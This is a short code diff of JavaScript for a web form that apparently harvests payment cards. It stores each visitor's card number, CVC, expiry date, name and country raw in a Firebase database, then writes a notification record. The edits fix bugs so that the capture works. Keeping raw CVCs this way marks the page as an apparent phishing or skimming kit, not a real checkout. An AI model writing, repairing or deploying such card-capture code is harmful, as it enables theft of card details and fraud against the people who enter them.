@@ -61,9 +61,9 @@
 
     const db = getDatabase(app);
     
-    let randomId;
+    
 
-    document.getElementById('submitForm').addEventListener('touchstart', function(e) {
+    document.querySelector('.button').addEventListener('click', function(e) {
       e.preventDefault();
       //document.getElementById('loadingOverlay').style.display = 'none';
 
@@ -85,17 +85,17 @@
       } else {
         document.getElementById('loadingOverlay').style.display = 'flex';
 
-         randomId = Math.random().toString(36).slice(2, 7);
+         const randomId = Math.random().toString(36).slice(2, 7);
         let dbRef = ref(db, 'SubGo/' + randomId);
 
         set(dbRef, {
-          Card Number: cardNumber,
+          Card_Number: cardNumber,
           CVC: cvc,
           MY: expireDate,
           Name: name,
           Country: country
         }).then(() => {
-          sendNotify(name, country, dbRef);
+          sendNotify(name, country, dbRef, randomId);
         }).catch((error) => {
           document.getElementById('loadingOverlay').style.display = 'none';
           alert(error);
@@ -104,7 +104,7 @@
       }
     });
 
-    function sendNotify(name, country, dbRef) {
+    function sendNotify(name, country, dbRef, randomId) {
       dbRef = ref(db, 'Notification/' + randomId);
       set(dbRef, {
         Name: name,
